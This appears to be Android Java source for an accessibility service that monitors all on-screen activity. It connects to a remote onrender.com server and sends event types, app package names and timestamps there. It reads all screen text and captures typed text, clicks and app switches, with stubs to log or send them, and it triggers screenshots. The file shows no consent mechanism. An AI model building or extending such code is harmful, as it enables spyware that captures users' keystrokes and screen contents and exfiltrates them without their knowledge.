package com.example.myapplication.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Intent;
import android.app.ActivityManager;
import android.content.Context;
import android.os.Build;

public class ScreenMonitorAccessibilityService extends AccessibilityService {
    private SocketManager socketManager;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            processNode(rootNode);
            rootNode.recycle();
        }
        // Send event data to server
        if (socketManager != null && socketManager.isConnected()) {
            JSONObject eventData = new JSONObject();
            try {
                eventData.put("eventType", eventType);
                eventData.put("packageName", String.valueOf(event.getPackageName()));
                eventData.put("timestamp", System.currentTimeMillis());
                socketManager.sendAccessibilityData(eventData);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                String inputText = event.getText().toString();
                processTextInput(inputText);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                CharSequence className = event.getClassName();
                processClick(className, event);
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                processAppSwitch(packageName);
                // If your app is in the foreground, send broadcast to trigger screenshot
                if (isAppInForeground(getApplicationContext(), getPackageName())) {
                    Intent screenshotIntent = new Intent("com.example.myapplication.SCREENSHOT_ONCE");
                    screenshotIntent.putExtra("eventType", eventType);
                    screenshotIntent.putExtra("packageName", String.valueOf(event.getPackageName()));
                    screenshotIntent.putExtra("timestamp", System.currentTimeMillis());
                    sendBroadcast(screenshotIntent);
                }
                break;
        }
    }

    private void processNode(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String nodeText = node.getText().toString();
            // TODO: send or log nodeText
        }
        if (node.getContentDescription() != null) {
            String contentDesc = node.getContentDescription().toString();
            // TODO: send or log contentDesc
        }
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo childNode = node.getChild(i);
            if (childNode != null) {
                processNode(childNode);
                childNode.recycle();
            }
        }
    }

    private void processTextInput(String inputText) {
        // TODO: send or log inputText
    }

    private void processClick(CharSequence className, AccessibilityEvent event) {
        // TODO: send or log click event
    }

    private void processAppSwitch(String packageName) {
        // TODO: send or log app switch
    }

    @Override
    public void onInterrupt() {
        if (socketManager != null) {
            socketManager.disconnect();
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY |
                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
        // Start or reconnect to server
        if (socketManager == null) {
            socketManager = new SocketManager("https://myapplication4.onrender.com");
        }
        socketManager.connect();
    }

    private boolean isAppInForeground(Context context, String packageName) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (am == null) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            for (ActivityManager.AppTask task : am.getAppTasks()) {
                ActivityManager.RecentTaskInfo taskInfo = task.getTaskInfo();
                if (taskInfo != null && taskInfo.baseIntent != null &&
                    packageName.equals(taskInfo.baseIntent.getComponent().getPackageName())) {
                    return true;
                }
            }
        } else {
            // Deprecated but fallback for older devices
            for (ActivityManager.RunningTaskInfo taskInfo : am.getRunningTasks(1)) {
                if (taskInfo.topActivity != null &&
                    packageName.equals(taskInfo.topActivity.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }
} 